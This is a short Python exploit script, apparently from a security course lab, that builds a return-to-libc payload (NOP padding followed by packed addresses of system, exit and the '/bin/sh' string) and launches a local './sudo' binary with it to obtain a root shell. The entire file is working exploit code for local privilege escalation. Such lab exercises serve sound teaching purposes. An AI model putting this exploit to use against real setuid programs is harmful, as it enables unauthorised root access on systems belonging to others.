import os, sys
import addresses
import struct

PATH_TO_SUDO = './sudo'
EXIT_CODE = 0x42


def get_arg():
    # NOTES:
    # 1. Use `addresses.SYSTEM` to get the address of the `system` function
    # 2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    # 3. Use `addresses.EXIT` to get the address of the `exit` function
    return "\x90" * 66 + struct.pack("<I" , addresses.SYSTEM) + struct.pack("<I" , addresses.EXIT) + struct.pack("<I" ,addresses.LIBC_BIN_SH) + struct.pack("<B" , EXIT_CODE) 


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
